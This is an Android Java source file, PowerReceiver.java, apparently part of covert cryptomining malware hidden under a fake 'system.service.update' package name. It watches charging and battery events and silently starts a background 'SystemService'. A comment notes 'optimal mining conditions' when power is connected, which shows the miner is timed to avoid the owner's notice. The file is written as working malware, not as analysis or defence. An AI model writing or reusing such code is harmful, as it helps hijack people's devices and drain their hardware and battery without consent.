// PowerReceiver.java
package com.system.service.update;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;

public class PowerReceiver extends BroadcastReceiver {
    
    @Override
    public void onReceive(Context context, Intent intent) {
        String action = intent.getAction();
        
        if (action == null) {
            return;
        }
        
        switch (action) {
            case Intent.ACTION_POWER_CONNECTED:
                onPowerConnected(context);
                break;
            case Intent.ACTION_POWER_DISCONNECTED:
                onPowerDisconnected(context);
                break;
            case Intent.ACTION_BATTERY_LOW:
                onBatteryLow(context);
                break;
            case Intent.ACTION_BATTERY_OKAY:
                onBatteryOkay(context);
                break;
        }
    }
    
    private void onPowerConnected(Context context) {
        // Optimal mining conditions - full power available
        notifyService(context, "power_connected");
    }
    
    private void onPowerDisconnected(Context context) {
        // Reduce activity to conserve battery
        notifyService(context, "power_disconnected");
    }
    
    private void onBatteryLow(Context context) {
        // Stop intensive operations
        notifyService(context, "battery_low");
    }
    
    private void onBatteryOkay(Context context) {
        // Resume normal operations
        notifyService(context, "battery_okay");
    }
    
    private void notifyService(Context context, String action) {
        try {
            Intent serviceIntent = new Intent(context, SystemService.class);
            serviceIntent.setAction(action);
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(serviceIntent);
            } else {
                context.startService(serviceIntent);
            }
        } catch (Exception e) {
            // Silent fail
        }
    }
}
